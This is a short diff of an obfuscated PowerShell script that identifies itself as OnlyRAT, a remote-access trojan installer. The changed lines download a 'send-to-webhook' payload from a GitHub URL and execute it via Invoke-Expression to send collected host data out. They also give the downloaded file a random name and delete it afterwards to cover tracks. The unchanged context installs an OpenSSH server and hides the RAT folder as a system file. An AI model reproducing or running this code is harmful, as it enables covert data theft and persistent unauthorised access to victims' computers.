@@ -36,8 +36,9 @@ Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
 Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "LNaAIdkdKM.cmd"
-./LNaAIdkdKM.cmd $PEBgxuJUfd
+$VquGXMYQWi = RpLGWiUsIy
+Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
+Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
 mkdir $qsQBioVOkY
 Set-Location $qsQBioVOkY
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -58,5 +59,6 @@ Set-Location C:\Users
 attrib +h +s +r onlyrat 
 Set-Location $NyZnoLKCIs
 Remove-Item $CRYnrkaDbe
+Remove-Item "$VquGXMYQWi.cmd"
 Remove-Item lawFvVTikZ.txt
 Remove-Item KFPGaEYdcz.ps1
